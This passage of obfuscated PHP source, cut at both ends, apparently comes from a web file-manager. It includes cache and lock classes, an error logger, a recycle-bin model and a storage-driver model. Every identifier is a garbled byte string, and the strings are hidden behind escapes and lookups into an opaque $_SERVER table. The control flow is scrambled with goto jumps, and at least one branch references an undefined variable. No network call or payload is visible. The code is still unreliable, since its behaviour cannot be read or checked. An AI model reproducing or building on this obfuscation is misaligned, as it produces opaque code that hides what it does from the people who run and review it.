str_replace(array($A³ª‡â–ƒÕ[762], $A³ª‡â–ƒÕ[93], $A³ª‡â–ƒÕ[69]), $A³ª‡â–ƒÕ[763], $cÆî‡ïŒµ); return $this->cachePath . $A³ª‡â–ƒÕ[764] . $cÆî‡ïŒµ . $A³ª‡â–ƒÕ[765]; } public function set($CùÆ£²Áœ, $f•ƒãÇµˆÇ, $F›Í•ŸÓ™Ì = false) { $B…Á‰ÁëöŸ = $this->getFile($CùÆ£²Áœ); if (file_put_contents($B…Á‰ÁëöŸ, $this->prefix . $f•ƒãÇµˆÇ, LOCK_EX)) { return !0; } @unlink($B…Á‰ÁëöŸ); return !1; } public function get($C÷²¸ß…) { $Eëä‚ãÔ‚ = $this->getFile($C÷²¸ß…); if (file_exists($Eëä‚ãÔ‚) && filemtime($Eëä‚ãÔ‚) < time() - $this->cacheTime) { @unlink($Eëä‚ãÔ‚); return !1; } $e–Øœ÷½ = @file_get_contents($Eëä‚ãÔ‚); return substr($e–Øœ÷½, strlen($this->prefix)); } public function remove($Bèİ…¦ƒ÷) { $d³ô¯å·Î… = $this->getFile($Bèİ…¦ƒ÷); return @unlink($d³ô¯å·Î…); } public function deleteAll() { $a¯ÇíåŠ † =& $_SERVER[‚Ğ°–—î]; $a«è–İ×îğ = scandir($this->cachePath); foreach ($a«è–İ×îğ as $DÚ‰îíøÕÄ) { $d¿½½÷ôĞÒ = $this->cachePath . $DÚ‰îíøÕÄ; if (strpos($d¿½½÷ôĞÒ, $a¯ÇíåŠ †[765]) && strpos($d¿½½÷ôĞÒ, $a¯ÇíåŠ †[766])) { @unlink($d¿½½÷ôĞÒ); } } } public function clearTimeout() { $f£±ÁÒ‰Ó­ =& $_SERVER[‚Ğ°–—î]; $DÓ¹ªç™Í = scandir($this->cachePath); foreach ($DÓ¹ªç™Í as $d“…¿³ÑÛ) { $A‘ŸÏ¤ºèÉ = $this->cachePath . $d“…¿³ÑÛ; if (strpos($A‘ŸÏ¤ºèÉ, $f£±ÁÒ‰Ó­[765]) && strpos($A‘ŸÏ¤ºèÉ, $f£±ÁÒ‰Ó­[766]) && filemtime($A‘ŸÏ¤ºèÉ) < time() - $this->cacheTime) { @unlink($A‘ŸÏ¤ºèÉ); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { goto DÕŠèêÔ; DÕŠèêÔ: $bæèÆ…±©İ =& $_SERVER[‚Ğ°–—î]; if (self::$handle) { return self::$handle; } $b„½‘ñİÊ = $GLOBALS[$bæèÆ…±©İ[6]][$bæèÆ…±©İ[337]]; goto DàÊ’÷Š¤; aòÆôò±æ: if ($f»…‚Ù»’± == $bæèÆ…±©İ[17] && $aŞéùƒ‡Ú == $bæèÆ…±©İ[9]) { $f»…‚Ù»’± = $bæèÆ…±©İ[167]; } switch ($f»…‚Ù»’±) { case $bæèÆ…±©İ[757]: self::$handle = new CacheLockRedis(); break; case $bæèÆ…±©İ[758]: self::$handle = new CacheLockMemcached(); break; case $bæèÆ…±©İ[17]: self::$handle = new CacheLockDatabase(); break; case $bæèÆ…±©İ[167]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto eÔ‚‰Ø¦é‰; DàÊ’÷Š¤: self::$timeout = $b„½‘ñİÊ[$bæèÆ…±©İ[767]] ? $b„½‘ñİÊ[$bæèÆ…±©İ[767]] : 10; $aŞéùƒ‡Ú = _get($GLOBALS[$bæèÆ…±©İ[6]], $bæèÆ…±©İ[768]); $f»…‚Ù»’± = $b„½‘ñİÊ[$bæèÆ…±©İ[754]] ? $b„½‘ñİÊ[$bæèÆ…±©İ[754]] : $bæèÆ…±©İ[167]; goto aòÆôò±æ; eÔ‚‰Ø¦é‰: } private static function key($Dö–«‚âŠÀ) { return $_SERVER[‚Ğ°–—î][769] . Cache::key($Dö–«‚âŠÀ); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($fà¡¼ö›º = '') { self::$errorMsg = $fà¡¼ö›º; } public static function lockGlobal($BÆòÈñõ, $D§ÆŠ…ÑÒ) { return self::lock($BÆòÈñõ, $D§ÆŠ…ÑÒ, !0); } public static function lock($c‹£³í˜¨“, $BÍ¿§¦…£„ = false, $A³ÕƒŸæ¿É = false) { goto bñÚ¼†ÈÎÌ; bñÚ¼†ÈÎÌ: $cêˆšïğ¬‡ =& $_SERVER[‚Ğ°–—î]; $D°ÙÚ…·¾¥ = self::init(); $dÒ†Öœˆ–° = self::key($c‹£³í˜¨“); goto a ß­íŸáà; b•‚İß‚”: if (!$A³ÕƒŸæ¿É) { self::$lockItem[$dÒ†Öœˆ–°] = !0; } return $aùê «ä‚; goto EØÆ©ÔÆŒ; a ß­íŸáà: $BÍ¿§¦…£„ = $BÍ¿§¦…£„ ? $BÍ¿§¦…£„ : self::$timeout; $aùê «ä‚ = $D°ÙÚ…·¾¥->lock($dÒ†Öœˆ–°, $BÍ¿§¦…£„); if (!$aùê «ä‚) { $CÔˆùö™‚Ê = $cêˆšïğ¬‡[770] . $BÍ¿§¦…£„ . $cêˆšïğ¬‡[67] . self::$errorMsg . $cêˆšïğ¬‡[67] . get_caller_msg(); $DÍ»ˆ¢‹¦Ä = "\114\x6f\x63\153\x20\141\143\164\151\x6f\156\72\x20{$dÒ†Öœˆ–°}\x20\164\x69\155\x65\157\165\164\x2c\x6f\x76\x65\162\40{$BÍ¿§¦…£„}\x20\x73"; $DÍ»ˆ¢‹¦Ä = self::$errorMsg ? self::$errorMsg : $f÷ù»¸•Ñ¼; write_log($CÔˆùö™‚Ê, $cêˆšïğ¬‡[771]); show_json($DÍ»ˆ¢‹¦Ä, !1); } goto b•‚İß‚”; EØÆ©ÔÆŒ: } public static function lockGet($e‚ªÂ¹ÏŒ¡) { $aÁ±Åó°° = self::key($e‚ªÂ¹ÏŒ¡); if (self::$lockItem[$aÁ±Åó°°]) { return self::$lockItem[$aÁ±Åó°°]; } return self::init()->lockGet($aÁ±Åó°°); } public static function unlock($EÓè¨Ş¨Ë©) { $a‘• ·Šéß = self::key($EÓè¨Ş¨Ë©); self::$lockItem[$a‘• ·Šéß] = null; return self::init()->unlock($a‘• ·Šéß); } public static function unlockRuntime() { $E»âù‰“íğ =& $_SERVER[‚Ğ°–—î]; $b¢ìÀ•¹ = self::init(); $f›š‰»«´Â = !1; foreach (self::$lockItem as $eˆ“êèÒ => $cÂéË‚Ÿ½‹) { if (!$cÂéË‚Ÿ½‹) { continue; } $b¢ìÀ•¹->unlock($eˆ“êèÒ); if (!$f›š‰»«´Â) { $f›š‰»«´Â = !0; write_log($E»âù‰“íğ[772] . $eˆ“êèÒ . $E»âù‰“íğ[67] . get_caller_msg(), $E»âù‰“íğ[771]); continue; } write_log($E»âù‰“íğ[772] . $eˆ“êèÒ, $E»âù‰“íğ[771]); } } } goto Aœ¶¨àß¹; B±À—Ä±½: function beforeShutdownError($Eò¤Ö±—–Í = false, $aÈìô¶ë²ö = '', $aò²éÆÔ¯¦ = '', $fç‡åß”î… = 0) { $F˜«ê—»ÎÕ =& $_SERVER[ú]; switch ($Eò¤Ö±—–Í) { case E_PARSE: case E_ERROR: case E_CORE_ERROR: case E_COMPILE_ERROR: case E_USER_ERROR: $cí‘™Ò«¢˜ = $F˜«ê—»ÎÕ[39]; break; case E_WARNING: case E_USER_WARNING: case E_COMPILE_WARNING: case E_RECOVERABLE_ERROR: $cí‘™Ò«¢˜ = $F˜«ê—»ÎÕ[40]; break; case E_STRICT: $cí‘™Ò«¢˜ = $F˜«ê—»ÎÕ[41]; break; case E_NOTICE: case E_USER_NOTICE: $cí‘™Ò«¢˜ = $F˜«ê—»ÎÕ[42]; break; case E_DEPRECATED: case E_USER_DEPRECATED: $cí‘™Ò«¢˜ = $F˜«ê—»ÎÕ[43]; break; default: break; } if (!$cí‘™Ò«¢˜ || $cí‘™Ò«¢˜ == $F˜«ê—»ÎÕ[42] || $cí‘™Ò«¢˜ == $F˜«ê—»ÎÕ[43]) { return; } $aò²éÆÔ¯¦ = $F˜«ê—»ÎÕ[4] . str_replace($_SERVER[$F˜«ê—»ÎÕ[37]], $F˜«ê—»ÎÕ[20], $aò²éÆÔ¯¦); $e˜²·Î´¬ö = $cí‘™Ò«¢˜ . $F˜«ê—»ÎÕ[44] . $aÈìô¶ë²ö . $F˜«ê—»ÎÕ[44] . $aò²éÆÔ¯¦ . $F˜«ê—»ÎÕ[44] . $fç‡åß”î…; write_log($e˜²·Î´¬ö . $F˜«ê—»ÎÕ[18] . get_caller_msg(1), $F˜«ê—»ÎÕ[19]); } $_SERVER[$_SERVER[ú][45]] = $_SERVER[$_SERVER[ú][37]] . $_SERVER[ú][46]; $bÙŒ¯‚Ñˆ = strrev(base64_decode($_SERVER[ú][47])); goto EŒÔ…Òí–¬; aŠ¾æĞôœ: class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\157\x5f\x73\x6f\x75\162\143\145\137\x72\145\x63\171\x63\154\145"; protected $dataAuto = array(array("\143\162\145\141\x74\x65\x54\x69\155\x65", "\x74\151\x6d\145", "\x69\156\x73\145\x72\x74", "\146\x75\156\143\x74\151\157\x6e")); public function listData($C÷¶ğ¼‹ó = false) { $a±ÍÈŠğƒ =& $_SERVER[‚Ğ°–—î]; $C÷¶ğ¼‹ó = $C÷¶ğ¼‹ó ? $C÷¶ğ¼‹ó : USER_ID; $c¬®‚ìÒõ = $this->where(array($a±ÍÈŠğƒ[1429] => $C÷¶ğ¼‹ó))->select(); return array_to_keyvalue($c¬®‚ìÒõ, $a±ÍÈŠğƒ[33], $a±ÍÈŠğƒ[369]); } public function moveToRecycle($eèõ«ïİ›) { goto dôÀ§ŠÊíù; Fõç‹‹ÃõÒ: $this->recycleMove($eèõ«ïİ›, 1); if ($DÚ™ÔÑº ©[$E¡ÉÅ½ ˆ[370]] == $E¡ÉÅ½ ˆ[83]) { $DªÁ¶÷Ú—˜ = array($E¡ÉÅ½ ˆ[525] => array($E¡ÉÅ½ ˆ[483], $DÚ™ÔÑº ©[$E¡ÉÅ½ ˆ[459]] . $eèõ«ïİ› . $E¡ÉÅ½ ˆ[484])); $cÄ¤÷ã½§±->where($DªÁ¶÷Ú—˜)->setField($E¡ÉÅ½ ˆ[397], 1); } goto EİŠÓÛƒ; fõ»íºîÏ: if (!$DÚ™ÔÑº © || $DÚ™ÔÑº ©[$E¡ÉÅ½ ˆ[397]] == $E¡ÉÅ½ ˆ[83]) { return; } $F¨…ôÃƒ§ = array($E¡ÉÅ½ ˆ[383] => $eèõ«ïİ›, $E¡ÉÅ½ ˆ[1429] => USER_ID, $E¡ÉÅ½ ˆ[521] => $DÚ™ÔÑº ©[$E¡ÉÅ½ ˆ[371]], $E¡ÉÅ½ ˆ[522] => $DÚ™ÔÑº ©[$E¡ÉÅ½ ˆ[456]], $E¡ÉÅ½ ˆ[525] => $DÚ™ÔÑº ©[$E¡ÉÅ½ ˆ[459]]); $this->add($F¨…ôÃƒ§); goto Fõç‹‹ÃõÒ; dôÀ§ŠÊíù: $E¡ÉÅ½ ˆ =& $_SERVER[‚Ğ°–—î]; $cÄ¤÷ã½§± = Model($E¡ÉÅ½ ˆ[1118]); $DÚ™ÔÑº © = $cÄ¤÷ã½§±->sourceInfo($eèõ«ïİ›); goto fõ»íºîÏ; EİŠÓÛƒ: } public function clear() { $this->remove(!1); } public function remove($aã¢ê¶Åİé = false) { goto B§Óğƒ˜; C¼‚ØÄÙË•: foreach ($CÎØ˜á«œ™ as $b½Œƒªö‰ê) { $Eä¾ƒˆã¢Á->targetSpaceUpdate($b½Œƒªö‰ê[$c¦Â™êçŒö[371]], $b½Œƒªö‰ê[$c¦Â™êçŒö[456]]); } goto C´Á×¿¼‚°; e©ñ–¹òù°: $aã¢ê¶Åİé = $aã¢ê¶Åİé === !1 ? !1 : $aã¢ê¶Åİé; $CÎØ˜á«œ™ = array(); foreach ($e³Éˆ•øï as $fª±‚¿¦) { if ($aã¢ê¶Åİé != !1 && !in_array($fª±‚¿¦, $aã¢ê¶Åİé)) { continue; } $Eä¾ƒˆã¢Á->remove($fª±‚¿¦, !1); $a•µÓîÊåÈ = $this->where(array($c¦Â™êçŒö[369] => $fª±‚¿¦))->find(); $aë¯İŠ„Ù‚ = $a•µÓîÊåÈ[$c¦Â™êçŒö[371]] . $c¦Â™êçŒö[70] . $a•µÓîÊåÈ[$c¦Â™êçŒö[456]]; $CÎØ˜á«œ™[$aë¯İŠ„Ù‚] = array($c¦Â™êçŒö[521] => $a•µÓîÊåÈ[$c¦Â™êçŒö[371]], $c¦Â™êçŒö[456] => $a•µÓîÊåÈ[$c¦Â™êçŒö[456]]); $this->where(array($c¦Â™êçŒö[369] => $fª±‚¿¦))->delete(); } goto C¼‚ØÄÙË•; B§Óğƒ˜: $c¦Â™êçŒö =& $_SERVER[‚Ğ°–—î]; $Eä¾ƒˆã¢Á = Model($c¦Â™êçŒö[1118]); $e³Éˆ•øï = $this->listData(); goto e©ñ–¹òù°; C´Á×¿¼‚°: } public function restore($DæñÚ¤Àğâ = false) { goto Fİˆ¹ÀÊØÑ; D²×â‘ø®›: foreach ($a©ë¥¦Œù as $D¹º³×‘) { goto aø¨ÖÆ„â; EÕÊ‚Ø±Ô: if ($aÖ™ÈÇÉ‡Ñ[$C¸³®É—„ª[370]] == $C¸³®É—„ª[83]) { $fİğöÎ•„ = array($C¸³®É—„ª[525] => array($C¸³®É—„ª[483], $aÖ™ÈÇÉ‡Ñ[$C¸³®É—„ª[459]] . $D¹º³×‘ . $C¸³®É—„ª[484])); $F“Êæ·“òá->where($fİğöÎ•„)->setField($C¸³®É—„ª[397], 0); $this->restoreFolderChildren($D¹º³×‘, $a©ë¥¦Œù); } $this->where(array($C¸³®É—„ª[369] => $D¹º³×‘))->delete(); $F“Êæ·“òá->folderSizeReset($aÖ™ÈÇÉ‡Ñ[$C¸³®É—„ª[461]]); goto C¯ˆŞâÅ°’; bôğø˜¤ç: if ($E•¬ ãÊ[$C¸³®É—„ª[397]] == $C¸³®É—„ª[83]) { continue; } $F“Êæ·“òá->lockMoveStart($D¹º³×‘); $this->recycleMove($D¹º³×‘, 0); goto EÕÊ‚Ø±Ô; aø¨ÖÆ„â: if ($DæñÚ¤Àğâ != !1 && !in_array($D¹º³×‘, $DæñÚ¤Àğâ)) { continue; } $aÖ™ÈÇÉ‡Ñ = $F“Êæ·“òá->sourceInfo($D¹º³×‘); $E•¬ ãÊ = $F“Êæ·“òá->sourceInfo($aÖ™ÈÇÉ‡Ñ[$C¸³®É—„ª[461]]); goto bôğø˜¤ç; C¯ˆŞâÅ°’: $d‘ˆæäÜí¶[] = $aÖ™ÈÇÉ‡Ñ[$C¸³®É—„ª[461]]; if ($aÖ™ÈÇÉ‡Ñ[$C¸³®É—„ª[370]] == $C¸³®É—„ª[83]) { $d‘ˆæäÜí¶[] = $D¹º³×‘; } $F“Êæ·“òá->lockMoveEnd($D¹º³×‘); goto a«Õß¥÷ŠÕ; a«Õß¥÷ŠÕ: } $F“Êæ·“òá->updateModifyTime($d‘ˆæäÜí¶); goto eîŠî¦Ä†“; Fİˆ¹ÀÊØÑ: $C¸³®É—„ª =& $_SERVER[‚Ğ°–—î]; $F“Êæ·“òá = Model($C¸³®É—„ª[1118]); $a©ë¥¦Œù = $this->listData(); goto d„Ôäì …İ; d„Ôäì …İ: $DæñÚ¤Àğâ = $DæñÚ¤Àğâ == !1 ? !1 : $DæñÚ¤Àğâ; if (!$a©ë¥¦Œù) { return !0; } $d‘ˆæäÜí¶ = array(); goto D²×â‘ø®›; eîŠî¦Ä†“: } private function restoreFolderChildren($DÖ¦åŸ’, $B¯šë–øãƒ) { goto bÒÃ¥ÇƒÛô; C°ØÍŞÜ‰‡: $DïŒÜğÃ‰œ[$d¹—…õ¹Ä­[369]][1] = array_unique($DïŒÜğÃ‰œ[$d¹—…õ¹Ä­[369]][1]); $DïŒÜğÃ‰œ[$d¹—…õ¹Ä­[915]] = $d¹—…õ¹Ä­[2187]; $E ïŠ‚¤•->where($DïŒÜğÃ‰œ)->setField($d¹—…õ¹Ä­[397], 1); goto CÀŞÏòñØ; FáÅ›ßŠó±: foreach ($B¯šë–øãƒ as $BŞÚßÛƒŞÃ) { if ($BŞÚßÛƒŞÃ == $DÖ¦åŸ’) { continue; } if (!$E ïŠ‚¤•->isParentOf($DÖ¦åŸ’, $BŞÚßÛƒŞÃ)) { continue; } $f¾Â²†Ê¨í = $E ïŠ‚¤•->sourceInfo($BŞÚßÛƒŞÃ); if ($f¾Â²†Ê¨í[$d¹—…õ¹Ä­[370]] == $d¹—…õ¹Ä­[83]) { $DïŒÜğÃ‰œ[] = array($d¹—…õ¹Ä­[525] => array($d¹—…õ¹Ä­[483], $f¾Â²†Ê¨í[$d¹—…õ¹Ä­[459]] . $BŞÚßÛƒŞÃ . $d¹—…õ¹Ä­[484])); } else { $DïŒÜğÃ‰œ[$d¹—…õ¹Ä­[369]][1][] = $BŞÚßÛƒŞÃ; } } if (!$DïŒÜğÃ‰œ[$d¹—…õ¹Ä­[369]][1]) { unset($DïŒÜğÃ‰œ[$d¹—…õ¹Ä­[369]]); } if (!$DïŒÜğÃ‰œ) { return; } goto C°ØÍŞÜ‰‡; bÒÃ¥ÇƒÛô: $d¹—…õ¹Ä­ =& $_SERVER[‚Ğ°–—î]; $E ïŠ‚¤• = Model($d¹—…õ¹Ä­[1118]); $DïŒÜğÃ‰œ = array($d¹—…õ¹Ä­[369] => array($d¹—…õ¹Ä­[7], array())); goto FáÅ›ßŠó±; CÀŞÏòñØ: } private function recycleMove($C¨´±‚İâ, $eœÒŸÏ° = 1) { $eƒ¹„³Ãå =& $_SERVER[‚Ğ°–—î]; $CËÛŞÑ×Éš = Model($eƒ¹„³Ãå[1118]); $Dßîù—É = Model($eƒ¹„³Ãå[2365]); $f¦ÌƒÒ‹† = array($eƒ¹„³Ãå[369] => $C¨´±‚İâ); if ($eœÒŸÏ°) { $CËÛŞÑ×Éš->where($f¦ÌƒÒ‹†)->setField($eƒ¹„³Ãå[397], 1); $Dßîù—É->eventRecycle($C¨´±‚İâ, $eƒ¹„³Ãå[2366]); } else { $D¹’Ÿã´±¥ = $CËÛŞÑ×Éš->where($f¦ÌƒÒ‹†)->find(); $eÑ—ˆƒ¿ÖÇ = $D¹’Ÿã´±¥[$eƒ¹„³Ãå[370]] == $eƒ¹„³Ãå[83]; $Cˆôî¾†Ì = $CËÛŞÑ×Éš->fileNameAuto($D¹’Ÿã´±¥[$eƒ¹„³Ãå[461]], $D¹’Ÿã´±¥[$eƒ¹„³Ãå[28]], REPEAT_RENAME_FOLDER, $eÑ—ˆƒ¿ÖÇ); if ($Cˆôî¾†Ì != $D¹’Ÿã´±¥[$eƒ¹„³Ãå[28]]) { $CËÛŞÑ×Éš->rename($C¨´±‚İâ, $Cˆôî¾†Ì); } $CËÛŞÑ×Éš->where($f¦ÌƒÒ‹†)->setField($eƒ¹„³Ãå[397], 0); $Dßîù—É->eventRecycle($C¨´±‚İâ, $eƒ¹„³Ãå[2367]); } } } class StorageModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\x65\155\56\x73\x74\157\x72\x61\147\x65\114\151\x73\164"; public $field = array("\x6e\141\155\145", "\163\x69\172\145\x4d\x61\x78", "\163\x79\163\164\x65\x6d", "\144\x65\146\x61\x75\x6c\164", "\144\x72\x69\x76\145\162", "\143\x6f\x6e\146\151\x67"); public function listData($CÔ˜å¬…Öá = false, $fÃÁĞôèª¡ = "\155\157\x64\151\x66\171\124\x69\x6d\145", $eõ‡ËíÊ¿˜ = false) { goto CÕ÷†›†”; b‚Ş†‘­ÌŠ: foreach ($BˆñÑŠÀ±Ì as $A­­ˆâ¶ÇÑ => $eÅØßñš) { unset($BˆñÑŠÀ±Ì[$A­­ˆâ¶ÇÑ][$AØ‰˜Àˆ¹¸[6]]); $BˆñÑŠÀ±Ì[$A­­ˆâ¶ÇÑ][$AØ‰˜Àˆ¹¸[2093]] = 0; } $Cƒİ»•óâî = array_to_keyvalue($BˆñÑŠÀ±Ì, $AØ‰˜Àˆ¹¸[33], $AØ‰˜Àˆ¹¸[367]); $this->_listAppendSize($BˆñÑŠÀ±Ì, $Cƒİ»•óâî); goto FÓî÷àºÈ”; FÓî÷àºÈ”: return $BˆñÑŠÀ±Ì; goto EƒÁ°Å«Œ¯; CÕ÷†›†”: $AØ‰˜Àˆ¹¸ =& $_SERVER[‚Ğ°–—î]; $BˆñÑŠÀ±Ì = parent::listData($CÔ˜å¬…Öá, $fÃÁĞôèª¡, $eõ‡ËíÊ¿˜); if ($CÔ˜å¬…Öá) { return $BˆñÑŠÀ±Ì; } goto b‚Ş†‘­ÌŠ; EƒÁ°Å«Œ¯: } public function _listAppendSize(&$E¤‚ƒæÓ‚, $BÀåÚ…²£‰) { $c¦ß¹ö›Õˆ =& $_SERVER[‚Ğ°–—î]; if (!$BÀåÚ…²£‰) { return; } $A”ùÂ¸ÆÁŸ = $c¦ß¹ö›Õˆ[2368] . implode($c¦ß¹ö›Õˆ[47], $BÀåÚ…²£‰) . $c¦ß¹ö›Õˆ[2369]; $cƒÙªÀæ»¦ = Model($c¦ß¹ö›Õˆ[718])->query($A”ùÂ¸ÆÁŸ); $cƒÙªÀæ»¦ = array_to_keyvalue($cƒÙªÀæ»¦, $c¦ß¹ö›Õˆ[367], $c¦ß¹ö›Õˆ[77]); foreach ($E¤‚ƒæÓ‚ as $EªÈé÷¡½™ => $C›¾êĞÉõ) { $E¤‚ƒæÓ‚[$EªÈé÷¡½™][$c¦ß¹ö›Õˆ[2093]] = isset($cƒÙªÀæ»¦[$C›¾êĞÉõ[$c¦ß¹ö›Õˆ[367]]]) ? $cƒÙªÀæ»¦[$C›¾êĞÉõ[$c¦ß¹ö›Õˆ[367]]] : 0; } } public function getConfig($AÊÓµÀœàÊ) { $aæÉœ‚²º¦ = parent::listData($AÊÓµÀœàÊ); return json_decode($aæÉœ‚²º¦[$_SERVER[‚Ğ°–—î][6]], !0); } public function update($EÄ§±†Ÿ˜, $dÛ÷ÃŒİ’—) { goto F¼Ï¿Äšˆ; F¼Ï¿Äšˆ: $CùÉ‰­ÁÕ =& $_SERVER[‚Ğ°–—î]; $CÎÜô÷¸à = $dÛ÷ÃŒİ’—[$CùÉ‰­ÁÕ[28]]; $f•Íœ™ÁÖ = array_to_keyvalue(parent::listData(), $CùÉ‰­ÁÕ[28]); goto BÅ¶‡¢Ã‡Ò; f¶‚æÓå±Á: $e›Ì¾¾÷ÔÎ = parent::update($EÄ§±†Ÿ˜, $dÛ÷ÃŒİ’—); if ($e›Ì¾¾÷ÔÎ && $dÛ÷ÃŒİ’—[$CùÉ‰­ÁÕ[34]]) { foreach ($f•Íœ™ÁÖ as $E«©„Ã“õ½) { if ($E«©„Ã“õ½[$CùÉ‰­ÁÕ[34]] && $E«©„Ã“õ½[$CùÉ‰­ÁÕ[367]] != $EÄ§±†Ÿ˜) { parent::update($E«©„Ã“õ½[$CùÉ‰­ÁÕ[367]], array($CùÉ‰­ÁÕ[34] => 0)); } } } return $e›Ì¾¾÷ÔÎ; goto a¢Şİ‰ßÙ; BÅ¶‡¢Ã‡Ò: if (isset($f•Íœ™ÁÖ[$CÎÜô÷¸à]) && $f•Íœ™ÁÖ[$CÎÜô÷¸à][$CùÉ‰­ÁÕ[367]] != $EÄ§±†Ÿ˜) { return !1; } if (isset($dÛ÷ÃŒİ’—[$CùÉ‰­ÁÕ[2370]]) && $dÛ÷ÃŒİ’—[$CùÉ‰­ÁÕ[2370]] == $CùÉ‰­ÁÕ[83]) { $this->checkConfig($dÛ÷ÃŒİ’—); } unset($dÛ÷ÃŒİ’—[$CùÉ‰­ÁÕ[2370]]); goto f¶‚æÓå±Á; a¢Şİ‰ßÙ: } public function add($A£Ñ…î¨¢) { goto AèÁâ³Æ; AèÁâ³Æ: $eİè¿ĞÒË =& $_SERVER[‚Ğ°–—î]; $cÊ¦’©í® = array_to_keyvalue(parent::listData(), $eİè¿ĞÒË[28]); if (isset($cÊ¦’©í®[$A£Ñ…î¨¢[$eİè¿ĞÒË[28]]])) { return !1; } goto AŠìõåòË¢; C¶ïß‘ğ§ö: return $Eë­áªˆÅ; goto d™ÙåêÎ§; AŠìõåòË¢: $this->checkConfig($A£Ñ…î¨¢); $Eë­áªˆÅ = parent::insert($A£Ñ…î¨¢); if ($Eë­áªˆÅ && $A£Ñ…î¨¢[$eİè¿ĞÒË[34]]) { foreach ($cÊ¦’©í® as $f¶®¦¼ğ¡) { if ($f¶®¦¼ğ¡[$eİè¿ĞÒË[34]]) { parent::update($f¶®¦¼ğ¡[$eİè¿ĞÒË[367]], array($eİè¿ĞÒË[34] => 0)); } } } goto C¶ïß‘ğ§ö; d™ÙåêÎ§: } public function checkConfig(&$F¦‡ìßÜĞí) { goto dª¬Ó‹ğÅ; b¸´Í’®š: $fïÎš›µ‹[$A‘÷’Ê²Û“[1025]] = $A‰¿£æ’ØÈ; $F¦‡ìßÜĞí[$A‘÷’Ê²Û“[6]] = json_encode($fïÎš›µ‹); $F¦‡ìßÜĞí[$A‘÷’Ê²Û“[90]] = $FößŒÕ‘Š; goto eê¦†‘”Ë³; dª¬Ó‹ğÅ: $A‘÷’Ê²Û“ =& $_SERVER[‚Ğ°–—î]; $B‘–ù†äğï = strtolower($F¦‡ìßÜĞí[$A‘÷’Ê²Û“[90]]); $fïÎš›µ‹ = json_decode($F¦‡ìßÜĞí[$A‘÷’Ê²Û“[6]], !0); goto aíÈˆµƒâ†; dØÛ¿Ç¤ÁÍ: $A‰¿£æ’ØÈ = rtrim($fïÎš›µ‹[$A‘÷’Ê²Û“[1025]], $A‘÷’Ê²Û“[8]) . $A‘÷’Ê²Û“[8]; $D×æ°è‚­Å = $F™ßîåÅãÈ->getPath($A‰¿£æ’ØÈ . $A‘÷’Ê²Û“[1987]); if (!$F™ßîåÅãÈ->mkfile($D×æ°è‚­Å)) { show_json(LNG($A‘÷’Ê²Û“[2372]), !1); } goto b¸´Í’®š; aíÈˆµƒâ†: foreach ($fïÎš›µ‹ as $d„ŒÏ•†¤ˆ => $dÏˆéÉ×²Ú) { $fïÎš›µ‹[$d„ŒÏ•†¤ˆ] = trim($dÏˆéÉ×²Ú); } $fïÎš›µ‹[$A‘÷’Ê²Û“[2371]] = rand_string(6); $FößŒÕ‘Š = $this->driverType($B‘–ù†äğï); goto f¹ÌØ‹ ; eê¦†‘”Ë³: return !0; goto Fà—×Š„Ëˆ; f¹ÌØ‹ : $a©ó²¹£ğØ = $A‘÷’Ê²Û“[71] . $FößŒÕ‘Š; $F™ßîåÅãÈ = new $a©ó²¹£ğØ($fïÎš›µ‹); if (in_array($B‘–ù†äğï, $F™ßîåÅãÈ->objectDriver)) { if (!$F™ßîåÅãÈ->isBucketCors() && !$F™ßîåÅãÈ->setBucketCors()) { $C¾Ç´ãÇ£ = LNG($A‘÷’Ê²Û“[2372]); $C¾Ç´ãÇ£ .= $A‘÷’Ê²Û“[2373] . LNG($A‘÷’Ê²Û“[2374]); show_json($C¾Ç´ãÇ£, !1); } } goto dØÛ¿Ç¤ÁÍ; Fà—×Š„Ëˆ: } private function driverType($cöÈ¼õ•Óí) { $D¹ñŒõÔÜä =& $_SERVER[‚Ğ°–—î]; $DªƒØÊÅ‚Î = array($D¹ñŒõÔÜä[102] => $D¹ñŒõÔÜä[2375], $D¹ñŒõÔÜä[58] => $D¹ñŒõÔÜä[2376], $D¹ñŒõÔÜä[64] => $D¹ñŒõÔÜä[2377]); if (isset($DªƒØÊÅ‚Î[$cöÈ¼õ•Óí])) { return $DªƒØÊÅ‚Î[$cöÈ¼õ•Óí]; } return strtoupper($cöÈ¼õ•Óí); } public function driverListSystem() { $b°¶ˆ‚·Àö =& $_SERVER[‚Ğ°–—î]; $FÏ´öÜÆŒä = parent::listData(); $f»ãÉËÇİç = array(); foreach ($FÏ´öÜÆŒä as $e´œ†‘¶) { unset($e´œ†‘¶[$b°¶ˆ‚·Àö[187]], $e´œ†‘¶[$b°¶ˆ‚·Àö[107]]); $e´œ†‘¶[$b°¶ˆ‚·Àö[6]] = json_decode($e´œ†‘¶[$b°¶ˆ‚·Àö[6]], !0); $f»ãÉËÇİç[] = $e´œ†‘¶; } return $f»ãÉËÇİç; } public function defaultDriver() { $B Üø¿Â¼ =& $_SERVER[‚Ğ°–—î]; $B·£°Õ¾à– = parent::listData(); $DÍƒ‰ãÏÈÒ = array_filter_by_field($B·£°Õ¾à–, $B Üø¿Â¼[34], 1); $DÍƒ‰ãÏÈÒ = $DÍƒ‰ãÏÈÒ[0]; if ($DÍƒ‰ãÏÈÒ) { $DÍƒ‰ãÏÈÒ[$B Üø¿Â¼[6]] = json_decode($DÍƒ‰ãÏÈÒ[$B Üø¿Â¼[6]], !0); } return $DÍƒ‰ãÏÈÒ; } public function driverInfo($b¯»ôàí·†) { $a¨©ùÛÑ³ =& $_SERVER[‚Ğ°–—î]; $bå¥À¿‡à = array_to_keyvalue(parent::listData(), $a¨©ùÛÑ³[367]); if (!isset($bå¥À¿‡à[$b¯»ôàí·†])) { return !1; } $E®ªË·š° = $bå¥À¿‡à[$b¯»ôàí·†]; $E®ªË·š°[$a¨©ùÛÑ³[6]] = json_decode($E®ªË·š°[$a¨©ùÛÑ³[6]], !0); return $E®ªË·š°; } public function remove($AÚ‚èº­åÊ) { $this->removeShareItems($AÚ‚èº­åÊ); return parent::remove($AÚ‚èº­åÊ); } public function removeWithFile($dİœàĞæ®) { goto aÆ£ëÓ“–„; c·âØÃ×œ: $BªŞŒÏ³•æ = "\173\x69\157\72{$e¨ÖŞ¯Äæ„}\175\x2f"; $cŠ“Üï ˆ– = !0; $D¥Â‰•šŒ = array(); goto FÂÒƒø°¿; FÂÒƒø°¿: 